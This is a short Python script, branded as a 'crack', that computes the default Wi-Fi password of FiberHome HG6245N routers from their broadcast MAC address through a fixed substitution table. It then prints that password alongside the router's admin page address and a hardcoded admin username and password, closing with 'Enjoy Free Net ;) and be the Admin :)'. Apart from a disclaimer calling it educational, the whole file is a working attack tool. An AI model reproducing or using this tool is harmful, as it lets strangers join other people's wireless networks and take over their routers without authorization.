# This code is for educational purpose!!!
# I am not resposible, use it at your own risk!!!
# (c) All rights reserved to @y053f01

class colors:

 CGREY    = '\33[90m'
 CRED2    = '\33[91m'
 CGREEN2  = '\33[92m'
 CYELLOW2 = '\33[93m'
 CBLUE2   = '\33[94m'
 CVIOLET2 = '\33[95m'
 CBEIGE2  = '\33[96m'
 CWHITE2  = '\33[97m'

def generate_password(mac_address):
    # Transformation rules
    transformation = {
      'A': '5',
      'B': '4',
      'C': '3',
      'D': '2',
      'E': '1',
      'F': '0',
      '8': '7',
      '9': '6',
      '6': '9',
      '5': 'A',
      '4': 'B',
      '3': 'C',
      '2': 'D',
      '1': 'E',
      '0': 'F',
      '7': '8'}

    # Extract the last three parts of the MAC address
    parts = mac_address.split(':')
    last_three_parts = ''.join(parts[-3:]).upper()

    # Apply reverse transformation rules to the last three parts
    transformed_parts = ''.join(transformation.get(char, char) for char in last_three_parts)

    # Generate the password
    password = 'wlan' + transformed_parts.lower()
    return password

def main():
    # Prompt the user to enter the MAC address
    print(f"""

  {colors.CGREEN2} ###############   {colors.CWHITE2}fh_xxxxxx Crack  {colors.CGREEN2} ###############
                                                                                                 
         {colors.CYELLOW2}Developer: {colors.CRED2}@y053f01{colors.CGREEN2}
         {colors.CYELLOW2}Version: {colors.CBLUE2}1.2{colors.CGREEN2}
         {colors.CYELLOW2}Target: {colors.CWHITE2}FiberHome Modem{colors.CGREEN2}
         {colors.CYELLOW2}Modem version: {colors.CWHITE2}HG6245N{colors.CGREEN2}
         {colors.CYELLOW2}MAC Address patern: {colors.CBLUE2}6C:A5:D1:XX:XX:XX{colors.CGREEN2}
         {colors.CWHITE2}(c) All rights reserved{colors.CGREEN2}
                                                                                 
   ###################################################{colors.CWHITE2}

""")
    mac_address = input("Enter the BSSID (MAC address) [6C:A5:D1:XX:XX:XX]: ").upper()

    # Check if the first three parts of the MAC address match a specific pattern
    if mac_address[:8] != '6C:A5:D1':
        print(f"""\n{colors.CYELLOW2}Can't generate the password, it not fh_xxxxxx FiberHome modem :( """)
    else:
        # Generate the SSID
        ssid = 'fh_' + ''.join(mac_address.split(':')[3:]).upper()

        # Generate the password
        password = generate_password(mac_address)

        # Print the MAC address, SSID, and password in lowercase
        print(f"""
{colors.CWHITE2}BSSID (MAC Address) is:  6C:A5:D1:XX:XX:XX
SSID: {ssid.lower()}
PSK (Password): {colors.CGREEN2}{password.lower()}{colors.CWHITE2}
Admin Web: http://192.168.1.1
Admin Username: User_OT_FH"
Admin Password: User@1234_FH
Enjoy Free Net ;) and be the Admin :)
""")

if __name__ == "__main__":
    main()
